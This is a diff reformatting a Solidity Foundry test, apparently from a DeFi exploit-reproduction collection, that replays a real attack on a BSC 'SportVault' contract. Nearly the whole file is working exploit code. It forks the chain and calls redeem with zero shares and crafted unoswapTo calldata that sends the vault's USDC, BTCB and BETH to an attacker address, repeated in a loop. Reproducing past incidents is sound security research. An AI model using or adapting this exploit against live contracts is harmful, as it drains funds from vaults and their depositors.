@@ -9,18 +9,15 @@ import "../interface.sol";
 // @TX
 // https://app.blocksec.com/explorer/tx/bsc/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec
 
-interface ISportVault{
+interface ISportVault {
     function redeem(
         uint256 sharesToRedeem,
         address receivingAsset,
         uint256 minTokensToReceive,
         bytes[] calldata dataList,
         bool useDiscount
-    )
-    external
-    returns (uint256 tokensToReturn);
+    ) external returns (uint256 tokensToReturn);
 }
-
 
 contract ContractTest is Test {
     IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
@@ -30,7 +27,7 @@ contract ContractTest is Test {
     ISportVault sportVault = ISportVault(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4);
 
     address Attacker = address(0x1111111111111111111111111111111111111111);
-    
+
     function setUp() public {
         vm.createSelectFork("bsc", 38_126_753);
     }
@@ -38,36 +35,42 @@ contract ContractTest is Test {
     function testExploit() public {
         bytes[] memory dataList = new bytes[](11); //@note mock data list - unoswapTo
         uint256[] memory pools = new uint256[](1);
-        pools[0] = uint256(28948022309329048857350594136651893637891169795467361725136627244723734772827);
+        pools[0] = uint256(
+            28_948_022_309_329_048_857_350_594_136_651_893_637_891_169_795_467_361_725_136_627_244_723_734_772_827
+        );
         dataList[0] = abi.encodeWithSignature(
             "unoswapTo(address,address,uint256,uint256,uint256[])",
             Attacker,
             address(USDC),
-            2331516232778274153239,
+            2_331_516_232_778_274_153_239,
             0,
             pools
         );
 
-        pools[0] = uint256(28948022309329048857350594135968575911172281388296638049447197314275709206658);
+        pools[0] = uint256(
+            28_948_022_309_329_048_857_350_594_135_968_575_911_172_281_388_296_638_049_447_197_314_275_709_206_658
+        );
         dataList[1] = abi.encodeWithSignature(
             "unoswapTo(address,address,uint256,uint256,uint256[])",
             Attacker,
             address(BTCB),
-            16071737934381556,
+            16_071_737_934_381_556,
             0,
             pools
         );
 
-        pools[0] = uint256(28948022309329048857350594136076890004755093450729657598371073172666212569020);
+        pools[0] = uint256(
+            28_948_022_309_329_048_857_350_594_136_076_890_004_755_093_450_729_657_598_371_073_172_666_212_569_020
+        );
         dataList[2] = abi.encodeWithSignature(
             "unoswapTo(address,address,uint256,uint256,uint256[])",
             Attacker,
             address(BETH),
-            256895663903293078,
+            256_895_663_903_293_078,
             0,
             pools
         );
-          
+
         dataList[3] = new bytes(0);
         dataList[4] = new bytes(0);
         dataList[5] = new bytes(0);
@@ -79,22 +82,15 @@ contract ContractTest is Test {
 
         console2.log("Attacker BNB balance before: ", Attacker.balance);
 
-        for(uint i = 0; i < 20; i++){
+        for (uint256 i = 0; i < 20; i++) {
             USDC.balanceOf(address(sportVault));
             BTCB.balanceOf(address(sportVault));
             BETH.balanceOf(address(sportVault));
             BUSD.balanceOf(address(sportVault));
 
-            sportVault.redeem(
-                0,
-                address(BUSD),
-                0,
-                dataList, 
-                false
-            );
+            sportVault.redeem(0, address(BUSD), 0, dataList, false);
         }
 
         console2.log("Attacker BNB balance after: ", Attacker.balance);
     }
-
 }
